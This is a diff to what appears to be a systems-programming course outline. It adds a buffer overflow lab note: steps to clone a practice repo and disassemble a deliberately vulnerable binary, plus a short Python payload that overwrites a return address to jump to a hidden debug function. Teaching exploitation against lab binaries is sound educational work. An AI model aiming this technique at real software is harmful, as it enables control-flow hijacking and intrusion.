@@ -41,3 +41,22 @@
 11. Multithreading/Multi-cores programming
     > Course project
     > Examples: Mini-shell, Custom Kernel, etc...
+
+> [!NOTE]
+> The Buffer overflow examples
+> clone https://github.com/lowlevellearning/secure-server-stuff.git
+> objdump -d ./hacked | less and search for the debug func
+> add char *gets(char *str); // Declare gets() manually to the hacked.c
+
+```python
+# 080491e6 = debug address
+import sys
+
+payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCEEEE"
+
+payload += b"\x08\x04\x91\xe6"[::-1]
+
+sys.stdout.buffer.write(payload)
+```
+
+> (python3 ./exploit.py;cat) | ./hacked
